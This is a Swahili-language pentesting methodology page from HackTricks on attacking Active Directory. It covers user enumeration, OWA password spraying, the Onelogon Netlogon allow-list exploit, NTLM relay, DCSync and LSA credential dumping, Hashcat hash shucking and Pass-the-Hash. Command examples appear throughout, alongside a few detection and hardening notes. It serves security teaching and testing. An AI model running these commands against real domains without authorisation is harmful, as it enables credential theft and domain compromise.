# Mbinu ya Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari wa msingi

**Active Directory** ni teknolojia ya msingi inayowezesha **wasimamizi wa mtandao** kuunda na kudhibiti kwa ufanisi **domains**, **watumiaji**, na **objects** ndani ya mtandao. Imeundwa ili iweze kupanuka, na kuwezesha kupanga idadi kubwa ya watumiaji katika **groups** na **subgroups** zinazoweza kudhibitiwa, huku ikidhibiti **haki za ufikiaji** katika viwango mbalimbali.

Muundo wa **Active Directory** una tabaka tatu kuu: **domains**, **trees**, na **forests**. **Domain** hujumuisha mkusanyiko wa objects, kama vile **watumiaji** au **vifaa**, zinazotumia hifadhidata moja. **Trees** ni makundi ya domains hizi zilizounganishwa kupitia muundo unaofanana, na **forest** ni mkusanyiko wa trees nyingi zilizounganishwa kupitia **trust relationships**, na hivyo kuunda tabaka la juu kabisa la muundo wa shirika. **Haki za ufikiaji** na **mawasiliano** mahususi zinaweza kubainishwa katika kila moja ya viwango hivi.

Dhana muhimu katika **Active Directory** ni pamoja na:

1. **Directory** – Huhifadhi taarifa zote zinazohusu objects za Active Directory.
2. **Object** – Hurejelea vipengele vilivyo ndani ya directory, ikiwemo **watumiaji**, **groups**, au **folda zilizoshirikiwa**.
3. **Domain** – Hufanya kazi kama kontena la objects za directory, na domains nyingi zinaweza kuwepo ndani ya **forest**, kila moja ikiwa na mkusanyiko wake wa objects.
4. **Tree** – Kundi la domains zinazotumia domain moja ya msingi.
5. **Forest** – Kilele cha muundo wa shirika katika Active Directory, kinachoundwa na trees kadhaa zenye **trust relationships** kati yake.

**Active Directory Domain Services (AD DS)** hujumuisha huduma mbalimbali muhimu kwa usimamizi wa kati na mawasiliano ndani ya mtandao. Huduma hizi ni pamoja na:

1. **Domain Services** – Huweka data mahali pamoja na kudhibiti mwingiliano kati ya **watumiaji** na **domains**, ikiwemo utendaji wa **uthibitishaji** na **utafutaji**.
2. **Certificate Services** – Husimamia uundaji, usambazaji na usimamizi wa **vyeti vya kidijitali** salama.
3. **Lightweight Directory Services** – Hutoa usaidizi kwa programu zinazotumia directory kupitia **itifaki ya LDAP**.
4. **Directory Federation Services** – Hutoa uwezo wa **single-sign-on** wa kuthibitisha watumiaji katika programu nyingi za wavuti ndani ya kipindi kimoja.
5. **Rights Management** – Husaidia kulinda nyenzo zilizo na hakimiliki kwa kudhibiti usambazaji na matumizi yake yasiyoidhinishwa.
6. **DNS Service** – Ni muhimu kwa utatuzi wa **majina ya domain**.

Kwa maelezo zaidi, angalia: [**TechTerms - Ufafanuzi wa Active Directory**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili kujifunza jinsi ya **kushambulia AD**, unahitaji **kuelewa** vizuri sana **mchakato wa uthibitishaji wa Kerberos**.\
[Soma ukurasa huu ikiwa bado hujui jinsi unavyofanya kazi.](kerberos-authentication.md)

## Muhtasari wa Amri

Unaweza kwenda [https://wadcoms.github.io/](https://wadcoms.github.io) ili kuona haraka amri unazoweza kutumia kuorodhesha/kutumia vibaya AD.

> [!WARNING]
> Mawasiliano ya Kerberos kwa kawaida **yanahitaji jina la domain lililohitimu kikamilifu (FQDN)** ili mteja aweze kupata tiketi ya SPN sahihi. Kufikia mashine kwa kutumia anwani ya IP mara nyingi husababisha kutumia NTLM badala ya Kerberos.

## Upelelezi wa Active Directory (Bila credentials/sessions)

Ikiwa una ufikiaji wa mazingira ya AD pekee lakini huna credentials/sessions zozote, unaweza:

- **Kufanya pentest ya mtandao:**
  - Changanua mtandao, tafuta mashine na ports zilizo wazi, kisha ujaribu **kutumia vibaya udhaifu** au **kuchukua credentials** kutoka humo (kwa mfano, [printers zinaweza kuwa malengo ya kuvutia sana](ad-information-in-printers.md)).
  - Kuorodhesha DNS kunaweza kutoa taarifa kuhusu servers muhimu katika domain, kama vile web, printers, shares, vpn, media, n.k.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Angalia [**Mbinu ya Jumla ya Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) ili kupata maelezo zaidi kuhusu jinsi ya kufanya hivi.
- **Angalia ufikiaji wa null na Guest kwenye huduma za smb** (hili halitafanya kazi katika matoleo ya kisasa ya Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Mwongozo wa kina zaidi kuhusu jinsi ya kuorodhesha SMB server unapatikana hapa:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Orodhesha LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Mwongozo wa kina zaidi kuhusu jinsi ya kuorodhesha LDAP unapatikana hapa (zingatia **hasa ufikiaji usiojulikana**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Sumu mtandao**
  - Kusanya credentials kwa [**kuiga huduma kwa kutumia Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Fikia host kwa [**kutumia vibaya relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Kusanya credentials kwa **kuweka wazi** [**huduma bandia za UPnP kwa kutumia evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Toa usernames/majina kutoka kwenye nyaraka za ndani, mitandao ya kijamii na huduma (hasa web) ndani ya mazingira ya domain, pamoja na vyanzo vinavyopatikana kwa umma.
  - Ukipata majina kamili ya wafanyakazi wa kampuni, unaweza kujaribu miundo tofauti ya **usernames** ya AD ([**soma hapa**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Miundo inayotumika sana ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 kutoka kila jina), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, herufi _3 za nasibu na nambari 3 za nasibu_ (abc123).
  - Zana:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Uorodheshaji wa watumiaji

- **Uorodheshaji wa SMB/LDAP usiojulikana:** Angalia kurasa za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Uorodheshaji wa Kerbrute**: Wakati **username isiyo sahihi inapoombwa**, server itajibu kwa kutumia msimbo wa hitilafu wa **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, na kutuwezesha kubaini kuwa username hiyo si sahihi. **Usernames halali** zitasababisha jibu lenye **TGT katika AS-REP** au hitilafu ya _KRB5KDC_ERR_PREAUTH_REQUIRED_, inayoonyesha kuwa mtumiaji anahitaji kutekeleza uthibitishaji wa awali.
- **Bila uthibitishaji dhidi ya MS-NRPC**: Tumia auth-level = 1 (Bila uthibitishaji) dhidi ya kiolesura cha MS-NRPC (Netlogon) kwenye domain controllers. Mbinu hii huita kitendaji cha `DsrGetDcNameEx2` baada ya kuunganisha kwenye kiolesura cha MS-NRPC, ili kuangalia kama mtumiaji au kompyuta ipo bila credentials zozote. Zana ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) hutekeleza aina hii ya uorodheshaji. Utafiti unapatikana [hapa](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Ikiwa umepata mojawapo ya seva hizi kwenye mtandao, unaweza pia kufanya **user enumeration dhidi yake**. Kwa mfano, unaweza kutumia zana [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Unaweza kupata orodha za majina ya watumiaji katika [**repo hii ya github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) na hii ([**majina-ya-watumiaji-yanayowezekana-kistatistiki**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Hata hivyo, unapaswa kuwa na **majina ya watu wanaofanya kazi katika kampuni** kutoka kwenye hatua ya recon uliyopaswa kufanya kabla ya hili. Ukiwa na jina la kwanza na la mwisho, unaweza kutumia script [**namemash.py**](https://gist.github.com/superkojiman/11076951) kuzalisha majina ya watumiaji yanayoweza kuwa halali.

### Matumizi mabaya ya allow-list ya chaneli ya Netlogon iliyo hatarini (Onelogon)

Hata baada ya **Zerologon** kurekebishwa kwenye DC, akaunti zilizo kwenye allow-list kwa uwazi bado zinaweza kuathiriwa na **tabia ya zamani/iliyo hatarini ya chaneli salama ya Netlogon**. Usanidi hatari ni GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** au thamani ya usajili inayolingana **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Thamani hiyo ni **kifafanuzi cha usalama cha SDDL** (tazama [Security Descriptors](security-descriptors.md)). Akaunti au kikundi chochote kilichopewa ACE husika kwenye DACL kinaweza kulengwa. Kwa mfano, `O:BAG:BAD:(A;;RC;;;WD)` kimsingi huweka **Everyone** kwenye allow-list.

Mtiririko wa kazi wa operator:

1. **Tambua principal zilizo kwenye allow-list** kwa kukagua **SYSVOL/GPO** na **registry ya DC inayotumika**.
2. **Tatua SIDs** zilizopatikana kwenye SDDL ili zibainishe watumiaji/kompyuta halisi wa AD, kisha wape kipaumbele **akaunti za mashine za DC**, **akaunti za trust**, na mashine nyingine zenye upendeleo.
3. Jaribu mara kwa mara **uthibitishaji wa MS-NRPC / Netlogon** kama akaunti iliyo kwenye allow-list.
4. Baada ya kukisia kwa mafanikio, tumia vibaya **uwekaji wa nenosiri wa Netlogon** ili kuweka upya nenosiri la akaunti inayolengwa (PoC ya umma hulifanya kuwa mfuatano tupu).<sup>[[9]](#references)[[10]](#references)</sup>

Mifano ya haraka ya triage / lab kutoka kwenye kifaa cha umma:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notes:

- **scanner** ni muhimu kwa sababu allow-list inayotumika inaweza kuwa kwenye **SYSVOL**, kwenye **registry**, au kwenye vyote viwili.
- Njia ya **exploit** yenyewe ni muhimu kwa sababu **haihitaji ruhusa za Domain Admin** baada ya akaunti iliyo hatarini kutambuliwa.
- Kuhatarisha **akaunti ya mashine ya Domain Controller** kama `DC$` ni hatari hasa kwa sababu kuweka upya nenosiri hilo kunaweza kuwezesha moja kwa moja njia pana zaidi za **kuteka AD**.
- Uwezekano wa **brute-force** hutegemea mode: artifact ya umma inaeleza mbinu ya meet-in-the-middle, brute force ya **24-bit** wakati akaunti nyingine ya kompyuta inapatikana, na variants za **32-bit** zilizo polepole zaidi.

Notes za utambuzi / uimarishaji wa usalama:

- Kagua sera ya allow-list na uondoe kila kitu isipokuwa vighairi vya muda vya uoanifu vinavyohitajika waziwazi.
- Fuatilia matukio ya DC **System** **5827/5828/5829/5830/5831** ili kugundua miunganisho ya Netlogon iliyo hatarini inapokataliwa, kugunduliwa, au kuruhusiwa waziwazi na sera.
- Chukulia akaunti zilizo kwenye `VulnerableChannelAllowList` kuwa **hatari kubwa** hadi utegemezi wa zamani utakapoondolewa.

### Kujua jina moja au majina kadhaa ya watumiaji

Sawa, kwa hiyo tayari unajua kuwa una jina halali la mtumiaji lakini huna nywila... Basi jaribu:

- [**ASREPRoast**](asreproast.md): Ikiwa mtumiaji **hana** sifa ya _DONT_REQ_PREAUTH_, unaweza **kuomba ujumbe wa AS_REP** wa mtumiaji huyo, ambao utakuwa na baadhi ya data iliyosimbwa kwa kutumia derivation ya nywila ya mtumiaji.
- [**Password Spraying**](password-spraying.md): Tujaribu **nywila zinazotumika sana** kwa kila mtumiaji aliyegunduliwa; huenda mtumiaji fulani anatumia nywila dhaifu (zingatia sera ya nywila!).
  - Kumbuka kuwa unaweza pia kufanya **spray kwenye seva za OWA** ili kujaribu kupata ufikiaji wa seva za barua za watumiaji.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Huenda ukaweza **kupata** **hashes** za challenge kwa kufanya **poisoning** ya baadhi ya protocols za **mtandao**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Uhesabuji wa Active Directory hutoa majina ya watumiaji, vitambulisho vya barua pepe na mifumo ya majina, host zinazoweza kulengwa, na services zinazoweza kushawishiwa kufanya authentication. Tumia muktadha huo kubaini [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) za NTLM zinazowezekana na njia zinazoweza kuingia kwenye mazingira ya AD.

### Upelelezi unaoendeshwa na NetExec workspace na ukaguzi wa hali ya relay

- Tumia **`nxcdb` workspaces** kuhifadhi hali ya upelelezi wa AD kwa kila engagement: `workspace create <name>` huunda SQLite DB za kila protocol chini ya `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Badilisha mwonekano kwa `proto smb|mssql|winrm` na orodhesha secrets zilizokusanywa kwa `creds`. Futa data nyeti wewe mwenyewe ukimaliza: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Ugunduzi wa haraka wa subnet kwa **`netexec smb <cidr>`** huonyesha **domain**, **OS build**, **mahitaji ya SMB signing**, na **Null Auth**. Mashine wanachama zinazoonyesha `(signing:False)` zinaweza kuathiriwa na **relay**, ilhali DC mara nyingi huhitaji signing.
- Tengeneza **hostnames kwenye /etc/hosts** moja kwa moja kutoka kwa matokeo ya NetExec ili kurahisisha kulenga:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Wakati **SMB relay to the DC imezuiwa** na signing, bado chunguza hali ya **LDAP**: `netexec ldap <dc>` huonyesha `(signing:None)` / channel binding dhaifu. DC inayohitaji SMB signing lakini LDAP signing imezimwa bado ni lengo linalofaa la **relay-to-LDAP** kwa matumizi mabaya kama **SPN-less RBCD**.

### Kuvuja kwa credentials za domain kupitia printa za upande wa mteja → uthibitishaji wa credentials za domain kwa wingi

- UI za printa/wavuti wakati mwingine **huweka nywila za admin zilizofichwa ndani ya HTML**. Kuangalia source/devtools kunaweza kufichua maandishi wazi (kwa mfano, `<input value="<password>">`), na kuwezesha ufikiaji wa Basic-auth kwenye hazina za kuchanganua/kuchapisha.
- Kazi za uchapishaji zilizopatikana zinaweza kuwa na **nyaraka za onboarding za maandishi wazi** zenye nywila za kila mtumiaji. Weka jozi zake zikiwa zimeoanisha wakati wa kuzijaribu:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Steal NTLM Creds

Ikiwa unaweza **kufikia PC au shares nyingine** kwa kutumia **null au guest user**, unaweza **kuweka faili** (kama faili ya SCF) ambazo zikifikiwa kwa namna fulani zita**sababisha uthibitishaji wa NTLM dhidi yako** ili uweze **kuiba** **NTLM challenge** na kujaribu kuipata password:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** huchukulia kila NT hash uliyo nayo tayari kama password inayoweza kutumika kwa formats nyingine za polepole zaidi, ambazo key material yake hutokana moja kwa moja na NT hash. Badala ya kufanya brute-force ya passphrase ndefu katika Kerberos RC4 tickets, NetNTLM challenges, au cached credentials, unaingiza NT hashes kwenye modes za NT-candidate za Hashcat na kuiruhusu kuthibitisha matumizi tena ya password bila kuhitaji kujua plaintext. Hii huwa na nguvu hasa baada ya domain compromise ambapo unaweza kukusanya maelfu ya NT hashes za sasa na za zamani.<sup>[[5]](#references)</sup>

Tumia shucking wakati:

- Una mkusanyiko wa NT hashes kutoka DCSync, SAM/SECURITY dumps, au credential vaults na unahitaji kupima kama zimetumika tena katika domains/forests nyingine.
- Unakamata Kerberos material inayotumia RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, au DCC/DCC2 blobs.
- Unataka kuthibitisha haraka matumizi tena ya passphrases ndefu zisizoweza kupatikana kwa cracking, kisha ufanye pivot mara moja kupitia Pass-the-Hash.

Mbinu hii **haifanyi kazi** dhidi ya encryption types ambazo keys zake si NT hash (k.m., Kerberos etype 17/18 AES). Ikiwa domain inatekeleza AES pekee, lazima urudi kwenye modes za kawaida za password.

#### Kuunda mkusanyiko wa NT hashes

- **DCSync/NTDS** – Tumia `secretsdump.py` pamoja na history ili kupata seti kubwa iwezekanavyo ya NT hashes (na thamani zake za awali):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Entries za history huongeza sana idadi ya wagombea kwa sababu Microsoft inaweza kuhifadhi hadi hashes 24 za awali kwa kila akaunti. Kwa njia zaidi za kupata NTDS secrets, tazama:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (au Mimikatz `lsadump::sam /patch`) hutoa data ya ndani ya SAM/SECURITY na logons za domain zilizohifadhiwa kwenye cache (DCC/DCC2). Ondoa nakala zinazojirudia na uongeze hashes hizo kwenye orodha ileile ya `nt_candidates.txt`.
- **Fuatilia metadata** – Hifadhi username/domain iliyotoa kila hash (hata kama wordlist ina hex pekee). Hashes zinazolingana hukuonyesha mara moja ni principal gani inayotumia tena password baada ya Hashcat kuonyesha candidate iliyoshinda.
- Pendelea candidates kutoka forest ileile au forest inayoaminiwa; hilo huongeza uwezekano wa overlap wakati wa shucking.

#### Hashcat NT-candidate modes

| Aina ya Hash                            | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Maelezo:

- Ingizo za NT-candidate **lazima zibaki raw NT hashes zenye herufi 32 za hex**. Zima rule engines (usiweke `-r` wala kutumia hybrid modes) kwa sababu kubadilisha thamani huharibu candidate key material.
- Modes hizi si za kasi zaidi kiasili, lakini keyspace ya NTLM (~30,000 MH/s kwenye M3 Max) ni karibu mara 100 kasi zaidi ya Kerberos RC4 (~300 MH/s). Kujaribu orodha iliyochaguliwa kwa makini ya NT ni nafuu zaidi kuliko kuchunguza password space yote katika format ya polepole.
- Tumia **build ya hivi karibuni ya Hashcat** kila wakati (`git clone https://github.com/hashcat/hashcat && make install`) kwa sababu modes 31500/31600/35300/35400 zilitolewa hivi karibuni.<sup>[[7]](#references)</sup>
- Kwa sasa hakuna NT mode ya AS-REQ Pre-Auth, na AES etypes (19600/19700) zinahitaji plaintext password kwa sababu keys zake hutokana na password za UTF-16LE kupitia PBKDF2, si raw NT hashes.

#### Mfano – Kerberoast RC4 (mode 35300)

1. Nasa RC4 TGS ya SPN lengwa ukitumia mtumiaji mwenye privileges ndogo (tazama ukurasa wa Kerberoast kwa maelezo):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Toa ticket kwa kutumia orodha yako ya NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat hukokotoa RC4 key kutoka kwa kila NT candidate na kuthibitisha blob ya `$krb5tgs$23$...`. Match ikipatikana, inathibitisha kuwa service account inatumia mojawapo ya NT hashes zako zilizopo.

3. Hamia mara moja kupitia PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Unaweza kurejesha plaintext baadaye kwa hiari ukitumia `hashcat -m 1000 <matched_hash> wordlists/` ikihitajika.

#### Mfano – Cached credentials (mode 31600)

1. Dump logons zilizohifadhiwa kutoka kwenye workstation iliyoathiriwa:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Nakili mstari wa DCC2 wa mtumiaji wa domain anayevutia kwenye `dcc2_highpriv.txt` kisha uishuck:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Match iliyofanikiwa hutoa NT hash ambayo tayari inajulikana kwenye orodha yako, na kuthibitisha kwamba mtumiaji aliyehifadhiwa kwenye cache anatumia tena nenosiri. Itumie moja kwa moja kwa PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) au ifanyie brute-force katika hali ya NTLM ya haraka ili kupata maandishi yake.

Mtiririko huu wa kazi pia unatumika kwa challenge-responses za NetNTLM (`-m 27000/27100`) na DCC (`-m 31500`). Baada ya kupata match, unaweza kuanzisha relay, PtH kupitia SMB/WMI/WinRM, au ku-crack tena NT hash ukiwa offline kwa kutumia masks/rules.



## Kuhesabu Active Directory KWA kutumia credentials/session

Kwa awamu hii unahitaji kuwa **umekiuka credentials au session ya akaunti halali ya domain.** Ikiwa una credentials halali au shell kama mtumiaji wa domain, **kumbuka kwamba chaguo zilizotolewa awali bado zinaweza kutumika kucompromise watumiaji wengine**.

Kabla ya kuanza kuhesabu ukiwa umeingia, elewa **tatizo la Kerberos double-hop**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Kuhesabu

Kukompromiti akaunti ni **hatua kubwa kuelekea kutathmini domain**, kwa sababu inakuwezesha kufanya **hesabu ya Active Directory** iliyothibitishwa:

Kuhusu [**ASREPRoast**](asreproast.md), sasa unaweza kupata kila mtumiaji anayeweza kuwa hatarini; na kuhusu [**Password Spraying**](password-spraying.md), unaweza kupata **orodha ya majina yote ya watumiaji** na kujaribu nenosiri la akaunti iliyokompromitiwa, nywila tupu na nywila mpya zinazoonekana kuahidi.

- Unaweza kutumia [**CMD kufanya recon ya msingi**](../basic-cmd-for-pentesters.md#domain-info)
- Unaweza pia kutumia [**powershell kwa recon**](../basic-powershell-for-pentesters/index.html), ambayo itakuwa fiche zaidi
- Unaweza pia [**kutumia powerview**](../basic-powershell-for-pentesters/powerview.md) ili kutoa maelezo ya kina zaidi
- Zana nyingine bora ya kufanya recon kwenye active directory ni [**BloodHound**](bloodhound.md). **Haifichi sana** (kutegemea mbinu za ukusanyaji unazotumia), lakini **ikiwa hilo halikusumbui**, hakika unapaswa kuijaribu. Tafuta watumiaji wanaoweza kutumia RDP, tafuta njia ya kufikia makundi mengine, n.k.
  - **Zana nyingine za kiotomatiki za kuhesabu AD ni:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Rekodi za DNS za AD**](ad-dns-records.md), kwani zinaweza kuwa na taarifa zinazovutia.
- Zana yenye **GUI** unayoweza kutumia kuhesabu directory ni **AdExplorer.exe** kutoka kwenye Suite ya **SysInternal**.
- Unaweza pia kutafuta kwenye database ya LDAP ukitumia **ldapsearch** ili kutafuta credentials katika sehemu za _userPassword_ na _unixUserPassword_, au hata katika maelezo ya _description_ na _info_ ya mtumiaji. Tokeni isiyo na lebo, inayofanana na nenosiri katika _info_ ni mgombea tu: thibitisha madhumuni na uhalali wake kivyake, na usijumuishe maudhui ya maelezo hayo katika matokeo ya kawaida ya kuhesabu. Tazama [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) kwa mbinu nyingine.
- Kagua script za kuingia kwenye domain na za kupanga drive ambazo **una ruhusa ya kuzifikia**, chini ya `\\<dc>\NETLOGON` au `\\<dc>\SYSVOL\<domain>\scripts`. [Microsoft inaeleza](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) jukumu la share ya NETLOGON la kuhifadhi directory ya script. Orodhesha majina kwanza, kisha kagua tu script zinazohusika na zinazosomeka, zenye ukubwa unaoruhusiwa; usitoe nakala ya share nzima wala kuchapisha thamani za credentials wakati wa kuhesabu kwa kawaida. Wito wa PowerShell kwa [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **haulindi** nenosiri halisi lililohifadhiwa kwenye script. Wito huo pekee hauthibitishi kuwa siri imeandikwa moja kwa moja kwenye script: fuatilia ingizo lake halisi, kisha thibitisha kivyake akaunti, uhalali wa credentials na ruhusa zake. Kukagua script ya domain kwenye remote share ni tofauti na kuhesabu host ya ndani.
- Ikiwa unatumia **Linux**, unaweza pia kuhesabu domain ukitumia [**pywerview**](https://github.com/the-useless-one/pywerview).
- Unaweza pia kujaribu zana za kiotomatiki kama:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Kutoa watumiaji wote wa domain**

  Ni rahisi sana kupata majina yote ya watumiaji wa domain kutoka Windows (`net user /domain` ,`Get-DomainUser` au `wmic useraccount get name,sid`). Kwenye Linux, unaweza kutumia: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` au `enum4linux -a -u "user" -p "password" <DC IP>`

> Hata kama sehemu hii ya Enumeration inaonekana fupi, ndiyo sehemu muhimu zaidi ya zote. Fungua viungo (hasa vya cmd, powershell, powerview na BloodHound), jifunze jinsi ya kuhesabu domain na fanya mazoezi hadi ujisikie vizuri. Wakati wa assessment, huu ndio wakati muhimu wa kupata njia yako ya kufikia DA au kuamua kuwa hakuna kinachoweza kufanyika.

### Akaunti za kompyuta zilizoundwa mapema zinazotabirika -> ufikiaji wa nenosiri la gMSA

Akaunti za kompyuta zilizotayarishwa kwa ajili ya kujiunga na mifumo ya zamani zinaweza kubaki na nenosiri la awali linalotabirika. Moduli ya `pre2k` ya NetExec hutambua thamani bainifu ya `userAccountControl` ya `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) na kujaribu kupata Kerberos TGT kwa kutumia herufi 14 za mwanzo za jina la kompyuta lililoandikwa kwa herufi ndogo, bila `$` ya mwisho. Ichukulie thamani hii ya UAC kama kichujio cha kutambua wagombea, badala ya kudhani kwamba kuwa mwanachama wa **Pre-Windows 2000 Compatible Access** pekee kunathibitisha kuwa nenosiri ni dhaifu.<sup>[[18]](#references)[[20]](#references)</sup>

Tumia hesabu ya LDAP iliyothibitishwa kujaribu wagombea na kuhifadhi TGT zilizopatikana. `ALL=True` huongeza upimaji zaidi ya vitu vinavyolingana na kichujio chaguomsingi cha `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

